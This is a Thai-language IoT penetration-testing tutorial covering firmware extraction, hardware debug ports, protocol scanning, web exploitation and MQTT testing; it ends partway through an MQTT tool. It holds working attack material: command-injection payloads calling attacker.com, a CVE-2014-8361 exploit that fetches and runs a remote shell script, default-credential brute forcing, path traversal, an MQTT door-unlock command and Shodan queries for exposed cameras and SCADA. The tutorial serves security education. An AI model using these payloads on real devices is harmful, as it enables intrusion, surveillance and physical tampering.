# Part 80: IoT Security - การทดสอบความปลอดภัยอุปกรณ์ IoT

← [Part 79: Mobile Security](Part-79-Mobile-Security.md) | [Part 81: Wireless Security Advanced](Part-81-Wireless-Security-Advanced.md) →

---

## สารบัญ

1. [ภาพรวม IoT Security](#1-ภาพรวม-iot-security)
2. [IoT Attack Surface](#2-iot-attack-surface)
3. [OWASP IoT Top 10](#3-owasp-iot-top-10)
4. [Firmware Analysis](#4-firmware-analysis)
5. [Hardware Hacking](#5-hardware-hacking)
6. [Network Protocol Analysis](#6-network-protocol-analysis)
7. [Embedded System Exploitation](#7-embedded-system-exploitation)
8. [MQTT Security Testing](#8-mqtt-security-testing)
9. [Router/Gateway Hacking](#9-routergateway-hacking)
10. [Industrial Control Systems (ICS/SCADA)](#10-industrial-control-systems-icsscada)
11. [IoT Botnet Analysis](#11-iot-botnet-analysis)
12. [สรุปและ Lab Exercises](#12-สรุปและ-lab-exercises)

---

## 1. ภาพรวม IoT Security

### 1.1 ทำไม IoT Security ถึงสำคัญ

```
สถิติสำคัญ IoT:
- IoT devices ทั่วโลก: 15+ พันล้านเครื่อง (2024)
- คาดการณ์ปี 2030: 30 พันล้านเครื่อง
- มูลค่าตลาด IoT: $1.1 trillion/year
- 57% ของอุปกรณ์ IoT มีช่องโหว่ระดับ critical/high

ประเภทอุปกรณ์ IoT ที่พบบ่อย:
- Smart Home: Router, Camera, Thermostat, Lock
- Industrial: SCADA, PLC, HMI
- Healthcare: Medical devices, Wearables
- Automotive: Connected cars, ECUs
- Infrastructure: Power grid, Water systems

ความท้าทาย IoT Security:
1. Resource Constraints - CPU/Memory จำกัด
2. Long Lifecycle - ใช้งาน 10-20 ปีโดยไม่ update
3. Physical Accessibility - เข้าถึงได้จากภายนอก
4. Heterogeneity - อุปกรณ์หลากหลาย protocols
5. No Security Updates - vendor ยกเลิก support
```

### 1.2 IoT Pentesting Methodology

```
IoT Penetration Testing Phases:

[1. Reconnaissance]
    ├── OSINT (model numbers, firmware versions)
    ├── Shodan/Censys scan
    ├── FCC ID lookup (hardware info)
    └── CVE database search

[2. Network Analysis]
    ├── Network scanning (nmap, masscan)
    ├── Protocol identification
    ├── Traffic capture (Wireshark)
    └── Man-in-the-Middle

[3. Firmware Analysis]
    ├── Firmware extraction
    ├── Static analysis (binwalk, strings)
    ├── Emulation (QEMU, Firmadyne)
    └── Dynamic analysis

[4. Hardware Analysis]
    ├── PCB inspection
    ├── UART/JTAG/SPI/I2C
    ├── Debug port discovery
    └── Chip-off analysis

[5. API/Web Interface]
    ├── Web app testing
    ├── REST API testing
    ├── Cloud backend testing
    └── Mobile app (Companion App)

[6. Exploitation]
    ├── Vulnerability exploitation
    ├── Privilege escalation
    ├── Persistence
    └── Lateral movement
```

---

## 2. IoT Attack Surface

```
IoT Attack Vectors:

┌─────────────────────────────────────────┐
│           IoT Device                    │
│  ┌─────────────┐  ┌─────────────────┐  │
│  │  Hardware   │  │    Firmware     │  │
│  │ Debug Ports │  │ Hardcoded Creds │  │
│  │ UART/JTAG   │  │ Backdoors       │  │
│  │ Chip Vuln   │  │ Outdated SW     │  │
│  └─────────────┘  └─────────────────┘  │
└────────────┬────────────────────────────┘
             │ Network
     ┌───────┴────────┐
     │                │
 ┌───▼────┐     ┌─────▼───┐
 │  Local │     │  Cloud  │
 │Network │     │Backend  │
 │ WiFi   │     │  API    │
 │ Zigbee │     │  MQTT   │
 │  BLE   │     │  HTTP   │
 └───┬────┘     └─────┬───┘
     │                │
 ┌───▼────────────────▼───┐
 │    Mobile/Web App       │
 │  (Companion App)        │
 └────────────────────────┘
```

### 2.1 Discovery ด้วย Shodan

```python
#!/usr/bin/env python3
# iot_discovery.py - IoT Device Discovery

import shodan
import json
from typing import List, Dict

class IoTDiscovery:
    """ค้นหา IoT devices ด้วย Shodan API"""
    
    def __init__(self, api_key: str):
        self.api = shodan.Shodan(api_key)
    
    def search_vulnerable_devices(self, query: str, limit: int = 100) -> List[Dict]:
        """ค้นหา devices ตาม query"""
        results = []
        try:
            response = self.api.search(query, limit=limit)
            
            for match in response['matches']:
                device = {
                    'ip': match.get('ip_str'),
                    'port': match.get('port'),
                    'hostname': match.get('hostnames', []),
                    'org': match.get('org'),
                    'country': match.get('location', {}).get('country_name'),
                    'timestamp': match.get('timestamp'),
                    'banner': match.get('data', '')[:500],
                    'vulnerabilities': match.get('vulns', {}),
                }
                results.append(device)
        except shodan.APIError as e:
            print(f"[-] Shodan error: {e}")
        
        return results
    
    def find_default_creds(self) -> List[Dict]:
        """หา devices ที่ใช้ default credentials"""
        queries = [
            # Cameras
            'product:"netcam" country:TH',
            'webcam has_screenshot:true',
            'title:"camera" has_screenshot:true',
            
            # Routers
            'product:"MikroTik"',
            'html:"D-Link Router" port:80',
            'product:"Cisco" os:"IOS"',
            
            # Industrial
            'product:"SCADA"',
            'title:"Allen Bradley" port:44818',
            
            # MQTT
            'port:1883 product:"MQTT"',
            
            # Printers
            'title:"RICOH" port:80',
            'product:"HP Printer"',
        ]
        
        all_devices = []
        for query in queries:
            print(f"[*] Searching: {query}")
            devices = self.search_vulnerable_devices(query, limit=10)
            all_devices.extend(devices)
        
        return all_devices
    
    def scan_network(self, network: str) -> Dict:
        """Scan network range สำหรับ IoT devices"""
        query = f'net:{network}'
        return self.search_vulnerable_devices(query)


# ตัวอย่าง Shodan queries สำหรับ IoT
SHODAN_QUERIES = {
    'webcams': [
        'webcam has_screenshot:true',
        'product:"IP Camera" has_screenshot:true',
        'title:"Network Camera" has_screenshot:true',
        '/view/viewer_index.shtml',  # Hikvision
        'title:"DVR" has_screenshot:true',
    ],
    'routers': [
        'product:"Netgear" http.title:"NETGEAR"',
        'html:"TP-LINK" http.title:"TP-LINK"',
        'product:"D-Link" port:80',
    ],
    'industrial': [
        'port:102 S7 product:"Siemens"',
        'port:44818 product:"Rockwell"',
        'port:20000 product:"DNP3"',
        'port:502 product:"Modbus"',
    ],
    'default_creds': [
        'http.title:"Welcome" html:"admin" html:"password"',
        'html:"default username" html:"default password"',
    ],
}
```

---

## 3. OWASP IoT Top 10

```
OWASP IoT Top 10 (2018/Updated):

I1: Weak, Guessable, or Hardcoded Passwords
   - Default: admin/admin, admin/password
   - Hardcoded credentials ใน firmware
   - ไม่บังคับเปลี่ยน password

I2: Insecure Network Services
   - Unnecessary open ports
   - Unencrypted services (Telnet, HTTP)
   - UPnP enabled

I3: Insecure Ecosystem Interfaces
   - Web interface vulnerabilities (XSS, SQLi)
   - API without authentication
   - Cloud interface ไม่ปลอดภัย

I4: Lack of Secure Update Mechanism
   - Updates ไม่มี signature verification
   - Updates ผ่าน HTTP
   - ไม่มี update mechanism

I5: Use of Insecure or Outdated Components
   - Outdated OpenSSL
   - Vulnerable Linux kernel
   - Deprecated protocols

I6: Insufficient Privacy Protection
   - PII เก็บโดยไม่เข้ารหัส
   - ส่งข้อมูลไปยัง third parties
   - ไม่มี data minimization

I7: Insecure Data Transfer and Storage
   - Unencrypted communications
   - Sensitive data ใน flash storage ไม่เข้ารหัส

I8: Lack of Device Management
   - ไม่มี monitoring
   - ไม่สามารถ revoke credentials
   - ไม่มี audit logs

I9: Insecure Default Settings
   - Default credentials
   - Debug interfaces enabled
   - Unnecessary features enabled

I10: Lack of Physical Hardening
   - USB ports เปิดอยู่
   - JTAG/UART accessible
   - Easy chip extraction
```

---

## 4. Firmware Analysis

### 4.1 Firmware Extraction

```bash
# ================================================
# วิธีการ extract firmware
# ================================================

# 1. Download จาก vendor website
# ค้นหา: site:vendor.com firmware download
wget https://vendor.com/firmware/device_v1.2.3.bin

# 2. Extract จาก update traffic (MitM)
# ตั้งค่า proxy แล้วกด firmware update บนอุปกรณ์
mitmproxy -w firmware_capture.pcap

# 3. Flash memory dump (Hardware)
# ใช้ flashrom หรือ bus pirate

# ================================================
# Firmware Analysis ด้วย binwalk
# ================================================

# Install binwalk
apt-get install binwalk
pip3 install python-lzma

# ดู firmware structure
binwalk firmware.bin

# Extract firmware
binwalk -e firmware.bin
# หรือ extract พร้อม recursive
binwalk -Me firmware.bin

# ผลลัพธ์ที่ได้:
# _firmware.bin.extracted/
# ├── 100           <- squashfs filesystem
# ├── 100.squashfs
# ├── jffs2-root/   <- JFFS2 filesystem
# └── ...

# ดู filesystem content
ls _firmware.bin.extracted/squashfs-root/

# ================================================
# ค้นหา secrets ใน extracted firmware
# ================================================

FW_ROOT="_firmware.bin.extracted/squashfs-root"

# Default credentials
grep -rn 'password\|passwd\|admin' $FW_ROOT/etc/ 2>/dev/null
cat $FW_ROOT/etc/passwd
cat $FW_ROOT/etc/shadow

# SSH keys
find $FW_ROOT -name '*.pem' -o -name '*.key' -o -name 'id_rsa' 2>/dev/null

# API keys
grep -rn 'api_key\|apikey\|API_KEY' $FW_ROOT/ 2>/dev/null

# Hardcoded IPs/URLs
grep -rn -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' \
    $FW_ROOT/etc/ 2>/dev/null
grep -rn -E 'https?://[^ ]+' $FW_ROOT/ 2>/dev/null

# Backdoors
grep -rn 'backdoor\|debug\|test_mode' $FW_ROOT/ -i 2>/dev/null

# Private keys
grep -rn 'BEGIN.*PRIVATE KEY' $FW_ROOT/ 2>/dev/null

# SSL certificates
find $FW_ROOT -name '*.crt' -o -name '*.cer' | \
while read cert; do
    echo "Certificate: $cert"
    openssl x509 -in "$cert" -noout -subject -issuer 2>/dev/null
done

# ================================================
# Firmware Emulation ด้วย QEMU
# ================================================

# Install tools
apt-get install qemu-user-static
pip3 install firmadyne  # หรือ docker

# Emulate MIPS binary
qemu-mips-static -L $FW_ROOT $FW_ROOT/usr/sbin/httpd

# Emulate ARM binary
qemu-arm-static -L $FW_ROOT $FW_ROOT/usr/bin/busybox ls /

# ใช้ Firmadyne (full system emulation)
git clone https://github.com/firmadyne/firmadyne
cd firmadyne
./setup.sh
python3 sources/extractor/extractor.py -b Netgear \
    -sql 127.0.0.1 -np -nk firmware.bin images/
```

### 4.2 Firmware Analysis Script

```python
#!/usr/bin/env python3
# firmware_analyzer.py - Automated Firmware Analysis

import os
import re
import subprocess
import hashlib
from pathlib import Path
from typing import List, Dict, Set

class FirmwareAnalyzer:
    """Automated IoT Firmware Analyzer"""
    
    SENSITIVE_FILES = [
        'passwd', 'shadow', 'group',
        'httpd.conf', 'nginx.conf', 'lighttpd.conf',
        'config.ini', 'config.xml', 'settings.json',
        'wpa_supplicant.conf', 'hostapd.conf',
    ]
    
    SECRET_PATTERNS = [
        (r'(?i)password[\s]*[=:][\s]*([^\s"\'][^\s"\':]{3,})', 'Password'),
        (r'(?i)(admin|root)[\s]*:[\s]*([a-zA-Z0-9!@#$]{4,})', 'Default Creds'),
        (r'(?i)private_key[\s]*[=:][\s]*([\S]{10,})', 'Private Key'),
        (r'(?i)secret[\s]*[=:][\s]*([\S]{8,})', 'Secret'),
        (r'(?i)api[_-]?key[\s]*[=:][\s]*([A-Za-z0-9\-_]{20,})', 'API Key'),
        (r'-----BEGIN [A-Z]+ PRIVATE KEY-----', 'PEM Private Key'),
        (r'(?i)(debug|backdoor|test).*[=:][\s]*(true|1|yes|enable)', 'Debug/Backdoor'),
    ]
    
    VULNERABLE_FUNCTIONS = [
        'strcpy', 'strcat', 'sprintf', 'gets',  # Buffer overflow
        'system', 'popen', 'exec',              # Command injection
        'eval', 'assert',                        # Code injection
    ]
    
    def __init__(self, firmware_path: str):
        self.firmware_path = firmware_path
        self.output_dir = f"fw_analysis_{Path(firmware_path).stem}"
        self.findings = []
        os.makedirs(self.output_dir, exist_ok=True)
    
    def extract(self) -> str:
        """Extract firmware ด้วย binwalk"""
        print("[*] Extracting firmware...")
        extract_dir = f"{self.output_dir}/extracted"
        
        result = subprocess.run(
            ['binwalk', '-Me', self.firmware_path, '-C', extract_dir],
            capture_output=True, text=True
        )
        
        # หา squashfs root
        for root, dirs, files in os.walk(extract_dir):
            if 'bin' in dirs and 'etc' in dirs:
                print(f"[+] Found filesystem root: {root}")
                return root
        
        return extract_dir
    
    def analyze_binaries(self, fs_root: str) -> List[Dict]:
        """วิเคราะห์ binaries หา vulnerable functions"""
        findings = []
        
        binary_dirs = ['bin', 'sbin', 'usr/bin', 'usr/sbin']
        for d in binary_dirs:
            path = os.path.join(fs_root, d)
            if not os.path.exists(path):
                continue
            
            for binary in os.listdir(path):
                binary_path = os.path.join(path, binary)
                if not os.path.isfile(binary_path):
                    continue
                
                # ตรวจสอบ ELF binaries
                try:
                    with open(binary_path, 'rb') as f:
                        magic = f.read(4)
                    if magic != b'\x7fELF':
                        continue
                except Exception:
                    continue
                
                # ดู architecture
                file_result = subprocess.run(
                    ['file', binary_path],
                    capture_output=True, text=True
                ).stdout
                
                # ค้นหา vulnerable functions
                strings_result = subprocess.run(
                    ['strings', binary_path],
                    capture_output=True, text=True
                ).stdout
                
                vuln_funcs = [f for f in self.VULNERABLE_FUNCTIONS 
                             if f in strings_result]
                
                if vuln_funcs:
                    findings.append({
                        'binary': f"{d}/{binary}",
                        'arch': file_result[:100],
                        'vulnerable_functions': vuln_funcs
                    })
        
        return findings
    
    def find_secrets(self, fs_root: str) -> List[Dict]:
        """ค้นหา hardcoded secrets"""
        secrets = []
        
        # ค้นใน config files
        for root, _, files in os.walk(fs_root):
            for filename in files:
                filepath = os.path.join(root, filename)
                
                # Skip large files
                try:
                    if os.path.getsize(filepath) > 1024 * 1024:  # 1MB
                        continue
                except Exception:
                    continue
                
                try:
                    with open(filepath, 'r', errors='ignore') as f:
                        content = f.read()
                    
                    for pattern, secret_type in self.SECRET_PATTERNS:
                        matches = re.findall(pattern, content)
                        for match in matches:
                            secret_val = match if isinstance(match, str) else match[-1]
                            if len(secret_val) > 3:  # กรอง false positives
                                secrets.append({
                                    'type': secret_type,
                                    'file': filepath.replace(fs_root, ''),
                                    'value': secret_val[:100]
                                })
                except Exception:
                    pass
        
        return secrets
    
    def check_security_features(self, fs_root: str) -> Dict:
        """ตรวจสอบ security features"""
        features = {
            'aslr': False,
            'nx': False,
            'stack_canary': False,
            'telnet_enabled': False,
            'ssh_enabled': False,
            'debug_enabled': False,
        }
        
        # ตรวจสอบ services
        for service_dir in ['etc/init.d', 'etc/rc.d']:
            path = os.path.join(fs_root, service_dir)
            if os.path.exists(path):
                scripts = os.listdir(path)
                if any('telnet' in s.lower() for s in scripts):
                    features['telnet_enabled'] = True
                if any('ssh' in s.lower() for s in scripts):
                    features['ssh_enabled'] = True
        
        # ตรวจสอบ inittab
        inittab = os.path.join(fs_root, 'etc/inittab')
        if os.path.exists(inittab):
            with open(inittab, 'r', errors='ignore') as f:
                content = f.read()
            if 'ttyS0' in content or 'console' in content:
                features['debug_enabled'] = True
        
        return features
    
    def analyze(self) -> Dict:
        """Full firmware analysis"""
        print(f"\n{'='*60}")
        print(f"IoT Firmware Analysis")
        print('='*60)
        
        # Extract firmware
        fs_root = self.extract()
        
        # Find secrets
        print("\n[*] Scanning for secrets...")
        secrets = self.find_secrets(fs_root)
        print(f"    Found: {len(secrets)} secrets")
        for s in secrets[:5]:
            print(f"    [{s['type']}] {s['file']}: {s['value'][:50]}")
        
        # Analyze binaries
        print("\n[*] Analyzing binaries...")
        bin_findings = self.analyze_binaries(fs_root)
        print(f"    Vulnerable binaries: {len(bin_findings)}")
        
        # Security features
        print("\n[*] Checking security features...")
        sec_features = self.check_security_features(fs_root)
        for feature, enabled in sec_features.items():
            status = "ENABLED" if enabled else "disabled"
            if feature in ['telnet_enabled', 'debug_enabled'] and enabled:
                print(f"    [!] {feature}: {status}")
            else:
                print(f"    {feature}: {status}")
        
        report = {
            'firmware': self.firmware_path,
            'fs_root': fs_root,
            'secrets': secrets,
            'vulnerable_binaries': bin_findings,
            'security_features': sec_features,
        }
        
        return report
```

---

## 5. Hardware Hacking

### 5.1 Debug Port Discovery

```bash
# ================================================
# UART - Universal Asynchronous Receiver-Transmitter
# เป็น debug port ที่พบบ่อยที่สุดบน IoT devices
# ================================================

# Tools ที่ต้องการ:
# - Multimeter
# - Logic Analyzer (Saleae, DSLogic)
# - USB-to-UART adapter (CH340, PL2303, FT232)
# - Jumper wires

# ขั้นตอน:
# 1. เปิดอุปกรณ์ ดู PCB
# 2. หา 3-4 pin header ที่ label ว่า UART, DEBUG, J1 ฯลฯ
# 3. ใช้ multimeter วัด voltage:
#    - TX pin: ต้องมี voltage oscillation
#    - RX pin: ส่วนใหญ่ flat
#    - GND: 0V
#    - VCC: 3.3V หรือ 5V

# ค้นหา baud rate ด้วย baudrate.py
pip3 install baudrate
baudrate.py -p /dev/ttyUSB0

# เชื่อมต่อกับ minicom
minimcom -b 115200 -D /dev/ttyUSB0

# เชื่อมต่อกับ screen
screen /dev/ttyUSB0 115200

# เชื่อมต่อกับ picocom
picocom -b 115200 /dev/ttyUSB0

# ================================================
# JTAG - Joint Test Action Group
# สำหรับ debugging และ flash programming
# ================================================

# Tools:
# - OpenOCD
# - JTAGulator (หา JTAG pins อัตโนมัติ)
# - Bus Blaster

# Install OpenOCD
apt-get install openocd

# ค้นหา JTAG pins (ถ้ายังไม่รู้)
# ใช้ JTAGulator hardware tool

# เชื่อมต่อผ่าน OpenOCD
openocd -f interface/ftdi/jtagkey.cfg \
        -f target/at91sam3.cfg

# เมื่อเชื่อมต่อแล้ว
telnet localhost 4444
halt
flash banks
# dump flash
dump_image firmware_dump.bin 0x00000000 0x100000

# ================================================
# SPI Flash - ใช้ดึง firmware จาก flash chip
# ================================================

# Tools:
# - flashrom
# - CH341A programmer
# - SOIC clip

# ติดตั้ง flashrom
apt-get install flashrom

# ดู supported programmers
flashrom -L

# Detect flash chip
flashrom -p ch341a_spi

# Read firmware
flashrom -p ch341a_spi -r firmware_original.bin

# Write firmware (ระวัง!)
flashrom -p ch341a_spi -w modified_firmware.bin
```

### 5.2 Hardware Tools Summary

```
Hardware Hacking Tool Kit:

┌─────────────────────────────────────────────────┐
│               Essential Tools                    │
├──────────────────┬──────────────────────────────┤
│ Tool             │ Purpose                      │
├──────────────────┼──────────────────────────────┤
│ Multimeter       │ Voltage/continuity testing   │
│ Logic Analyzer   │ Signal capture/decoding      │
│ USB-UART (FT232) │ Serial console access        │
│ CH341A           │ SPI/I2C flash programming    │
│ Bus Pirate       │ Multi-protocol interface     │
│ Raspberry Pi     │ GPIO hacking platform        │
│ SOIC clips       │ In-circuit flash reading     │
│ Hot air station  │ SMD chip removal             │
│ Soldering iron   │ Probe attachment             │
│ Oscilloscope     │ Signal debugging             │
└──────────────────┴──────────────────────────────┘

Software Tools:
- binwalk       - Firmware extraction
- flashrom      - Flash programming
- OpenOCD       - JTAG debugging
- QEMU          - Firmware emulation
- Ghidra/IDA    - Binary analysis
- GDB           - Debugging
- Wireshark     - Network capture
```

---

## 6. Network Protocol Analysis

### 6.1 IoT Protocol Discovery

```bash
# ================================================
# Scan สำหรับ IoT protocols
# ================================================

TARGET="192.168.1.0/24"

# Nmap scan สำหรับ IoT ports
nmap -sV -p \
    21,22,23,25,53,80,443,554,1883,8080,8443,\
    5683,5684,44818,102,502,20000,47808 \
    $TARGET

# Common IoT ports:
# 21   - FTP (file upload/download)
# 22   - SSH
# 23   - Telnet (legacy, unencrypted)
# 80   - HTTP web interface
# 443  - HTTPS
# 554  - RTSP (video stream)
# 1883 - MQTT (IoT messaging)
# 5683 - CoAP (IoT protocol)
# 8080 - HTTP alternate
# 8883 - MQTT over TLS
# 44818 - EtherNet/IP (industrial)
# 102  - S7 protocol (Siemens)
# 502  - Modbus (industrial)

# ================================================
# RTSP Stream Discovery (Cameras)
# ================================================

# ค้นหา RTSP streams
nmap -p 554 --script rtsp-url-brute 192.168.1.0/24

# ลอง default RTSP paths
RTSP_PATHS=(
    "/stream1"
    "/video1"
    "/live"
    "/media"
    "/mpeg4/media.amp"
    "/Streaming/Channels/101"
    "/h264"
    "/live.sdp"
    "/channel1"
    "/cam/realmonitor"
)

for path in "${RTSP_PATHS[@]}"; do
    echo "Testing: rtsp://admin:admin@192.168.1.100${path}"
    # ใช้ ffprobe เพื่อตรวจสอบ
    timeout 3 ffprobe -v quiet \
        "rtsp://admin:admin@192.168.1.100${path}" 2>&1 | \
        grep -c "Stream" && echo "SUCCESS!" || true
done

# เปิด stream ด้วย VLC
vlc rtsp://admin:password@192.168.1.100:554/stream1
```

### 6.2 Zigbee/Z-Wave/BLE Analysis

```bash
# ================================================
# Zigbee Analysis
# ================================================

# ต้องการ: HackRF, YARD Stick One, หรือ CC2531 USB dongle

# ติดตั้ง KillerBee (Zigbee tool)
pip3 install killerbee

# Scan Zigbee networks
zbstumbler -i /dev/ttyUSB0

# Capture Zigbee packets
zbdump -i /dev/ttyUSB0 -c 15 -w zigbee_capture.pcap

# Analyze ด้วย Wireshark
wireshark zigbee_capture.pcap

# ================================================
# Bluetooth Low Energy (BLE) Analysis
# ================================================

# ใช้ hcitool และ bluetoothctl (built-in Kali)

# Scan สำหรับ BLE devices
hcitool lescan
# หรือ
bluetooth-ctl scan on

# ดู GATT services
gatttool -b AA:BB:CC:DD:EE:FF --primary
gatttool -b AA:BB:CC:DD:EE:FF --characteristics

# ใช้ bettercap สำหรับ BLE
bettercap -iface wlan0
# ใน bettercap shell:
# ble.recon on
# ble.show
# ble.enum AA:BB:CC:DD:EE:FF

# ================================================
# MQTT Analysis
# ================================================

# ติดตั้ง mosquitto clients
apt-get install mosquitto-clients

# Subscribe to all topics
mosquitto_sub -h 192.168.1.x -p 1883 -t '#' -v

# Publish to topic
mosquitto_pub -h 192.168.1.x -p 1883 \
    -t 'home/door/lock' -m 'UNLOCK'

# ถ้า require auth
mosquitto_sub -h target -u admin -P password -t '#' -v

# Brute force MQTT
python3 mqtt_brute.py --host target --wordlist users.txt
```

---

## 7. Embedded System Exploitation

### 7.1 Command Injection ใน Web Interface

```python
#!/usr/bin/env python3
# iot_web_exploit.py - IoT Web Interface Testing

import requests
import urllib.parse
from typing import List, Optional

requests.packages.urllib3.disable_warnings()

class IoTWebExploit:
    """Test IoT web interfaces สำหรับ common vulnerabilities"""
    
    def __init__(self, target: str, username: str = 'admin',
                 password: str = 'admin'):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.authenticated = False
        self.username = username
        self.password = password
    
    def try_default_creds(self) -> bool:
        """ลอง default credentials"""
        DEFAULT_CREDS = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '1234'),
            ('admin', '12345'),
            ('admin', '123456'),
            ('admin', ''),
            ('root', 'root'),
            ('root', ''),
            ('root', 'admin'),
            ('user', 'user'),
            ('guest', 'guest'),
            ('admin', 'admin123'),
        ]
        
        for username, password in DEFAULT_CREDS:
            try:
                response = self.session.post(
                    f"{self.target}/login",
                    data={'username': username, 'password': password},
                    timeout=5
                )
                
                if response.status_code == 200 and \
                   ('logout' in response.text.lower() or 
                    'dashboard' in response.text.lower() or
                    response.url != f"{self.target}/login"):
                    print(f"[+] LOGIN SUCCESS: {username}:{password}")
                    self.username = username
                    self.password = password
                    self.authenticated = True
                    return True
            except Exception:
                pass
        
        return False
    
    def test_command_injection(self, path: str, param: str) -> List[str]:
        """ทดสอบ Command Injection"""
        payloads = [
            # Basic injection
            '| id',
            '; id',
            '&& id',
            '`id`',
            '$(id)',
            # Shell
            '| cat /etc/passwd',
            '; cat /etc/shadow',
            # Time-based blind
            '| sleep 5',
            '; sleep 5',
            # OOB (Out-of-Band)
            '| ping -c 1 attacker.com',
            '; curl http://attacker.com/`id`',
            # Null byte
            'valid%00; id',
        ]
        
        successful = []
        
        for payload in payloads:
            try:
                import time
                start = time.time()
                
                response = self.session.get(
                    f"{self.target}{path}",
                    params={param: payload},
                    timeout=10
                )
                
                elapsed = time.time() - start
                
                # Check for command output
                if any(indicator in response.text for indicator in 
                       ['uid=', 'root:', '/bin/', 'www-data']):
                    print(f"[!] CMD INJECTION: {param}={payload}")
                    print(f"    Response: {response.text[:200]}")
                    successful.append(payload)
                
                # Time-based check
                elif 'sleep' in payload and elapsed >= 4.5:
                    print(f"[!] TIME-BASED CMD INJECTION: {param}={payload}")
                    successful.append(payload)
            except Exception as e:
                pass
        
        return successful
    
    def scan_common_paths(self) -> List[str]:
        """Scan สำหรับ common IoT web paths"""
        paths = [
            '/admin', '/administration',
            '/cgi-bin/admin.cgi', '/cgi-bin/luci',
            '/HNAP1', '/gena.cgi',
            '/setup.cgi', '/boardData102.php',
            '/diagnostic.php', '/ping.cgi',
            '/traceroute.cgi', '/nslookup.cgi',
            '/goform/setSysAdm',
            '/api/v1/admin', '/api/system',
            '/system/deviceInfo',
            '/.git', '/.env',
            '/etc/passwd',  # Path traversal test
            '/backup.cfg', '/config.bin',
        ]
        
        found = []
        for path in paths:
            try:
                response = self.session.get(
                    f"{self.target}{path}",
                    timeout=5
                )
                if response.status_code not in [404, 403]:
                    print(f"[+] Found: {path} ({response.status_code})")
                    found.append(path)
            except Exception:
                pass
        
        return found
    
    def test_path_traversal(self, vulnerable_path: str) -> List[str]:
        """ทดสอบ Path Traversal"""
        traversals = [
            '../../etc/passwd',
            '../../../etc/passwd',
            '../../../../etc/passwd',
            '..%2F..%2Fetc%2Fpasswd',
            '..%252F..%252Fetc%252Fpasswd',
            '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '....//....//etc/passwd',
        ]
        
        successful = []
        for traversal in traversals:
            try:
                response = self.session.get(
                    f"{self.target}{vulnerable_path}{traversal}",
                    timeout=5
                )
                if 'root:' in response.text or 'bin:' in response.text:
                    print(f"[!] PATH TRAVERSAL: {traversal}")
                    successful.append(traversal)
            except Exception:
                pass
        
        return successful


# Known IoT vulnerabilities
KNOWN_VULNS = {
    'Netgear': {
        'CVE-2017-5521': {
            'path': '/passwordrecovery.cgi',
            'method': 'GET',
            'description': 'Authentication bypass'
        },
        'Netgear HNAP': {
            'path': '/HNAP1/',
            'method': 'POST',
            'payload': 'SOAPAction: "http://purenetworks.com/HNAP1/GetDeviceSettings/`telnetd`"'
        }
    },
    'D-Link': {
        'CVE-2013-7389': {
            'path': '/phpcgi/index.php',
            'method': 'POST',
            'description': 'Unauthenticated RCE'
        }
    },
    'Hikvision': {
        'CVE-2021-36260': {
            'path': '/webapi/host/proc/command',
            'description': 'RCE via command injection',
            'method': 'PUT'
        }
    }
}
```

### 7.2 CVE Exploitation Examples

```bash
# ================================================
# CVE-2014-8361 - Realtek SDK
# Command Injection ใน miniigd SOAP service
# ================================================

# ค้นหา devices ที่มีช่องโหว่
nmap -p 52869 192.168.1.0/24

# Exploit
curl -s 'http://192.168.1.1:52869/picsdesc.xml'

curl -s -X POST 'http://192.168.1.1:52869/ctl/IPConn' \
  -H 'Content-Type: text/xml' \
  -d '<?xml version="1.0"?>
  <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
    <s:Body>
      <u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
        <NewEnabled>1</NewEnabled>
        <NewExternalPort>1234</NewExternalPort>
        <NewInternalClient>`wget http://attacker.com/shell.sh -O /tmp/s && chmod +x /tmp/s && /tmp/s`</NewInternalClient>
      </u:AddPortMapping>
    </s:Body>
  </s:Envelope>'

# ================================================
# CVE-2017-9101 - PLCM (Polycom)
# ================================================

# Unauthenticated RCE
curl -k 'https://192.168.1.1/api/rest/system/diagnostics' \
  -d 'pingIPAddress=127.0.0.1;id'

# ================================================
# CVE-2021-36260 - Hikvision Camera
# ================================================

curl -k -X PUT 'http://camera_ip/webapi/host/proc/command' \
  -H 'Content-Type: application/json' \
  -d '{"command": "id"}'

# ================================================
# CVE-2023-20198 - Cisco IOS XE
# ================================================

# ค้นหา devices
curl -k 'https://cisco_ip/webui/logoutconfirm.html?logon_hash=1'

# Check if vulnerable
curl -k -X POST 'https://cisco_ip/webui/logoutconfirm.html' \
  -d 'logon_hash=1' -v
```

---

## 8. MQTT Security Testing

### 8.1 MQTT Protocol Testing

```python
#!/usr/bin/env python3
# mqtt_tester.py - MQTT Security Testing Tool

import paho.mqtt.client as mqtt
import json
import time
import threading
from typing import List, Dict

class MQTTSecurityTester:
    """Test MQTT broker security"""
    
    def __init__(self, host: str, port: int = 1883):
        self.host = host
        self.port = port
        self.messages = []
        self.topics = set()
        self.connected = False
    
    def test_anonymous_access(self) -> bool:
        """ทดสอบ anonymous access"""
        client = mqtt.Client()
        result = {'connected': False}
        
        def on_connect(c, ud, flags, rc):
            if rc == 0:
                result['connected'] = True
                print(f"[+] Anonymous connection SUCCESSFUL to {self.host}:{self.port}")
            else:
                print(f"[-] Anonymous connection failed (rc={rc})")
        
        client.on_connect = on_connect
        
        try:
            client.connect(self.host, self.port, 60)
            client.loop_start()
            time.sleep(2)
            client.loop_stop()
            client.disconnect()
        except Exception as e:
            print(f"[-] Connection error: {e}")
        
        return result['connected']
    
    def subscribe_all(self, duration: int = 30) -> List[Dict]:
        """Subscribe to all topics และดักจับ messages"""
        client = mqtt.Client()
        messages = []
        
        def on_connect(c, ud, flags, rc):
            if rc == 0:
                c.subscribe('#')  # wildcard = ทุก topics
                c.subscribe('$SYS/#')  # broker system info
                print(f"[+] Subscribed to all topics")
        
        def on_message(c, ud, msg):
            try:
                payload = msg.payload.decode('utf-8', errors='ignore')
            except Exception:
                payload = str(msg.payload)
            
            message = {
                'topic': msg.topic,
                'payload': payload[:500],
                'qos': msg.qos,
                'timestamp': time.time()
            }
            messages.append(message)
            print(f"  [{msg.topic}]: {payload[:100]}")
        
        client.on_connect = on_connect
        client.on_message = on_message
        
        try:
            client.connect(self.host, self.port)
            print(f"[*] Listening for {duration} seconds...")
            client.loop_start()
            time.sleep(duration)
            client.loop_stop()
            client.disconnect()
        except Exception as e:
            print(f"[-] Error: {e}")
        
        # วิเคราะห์ messages
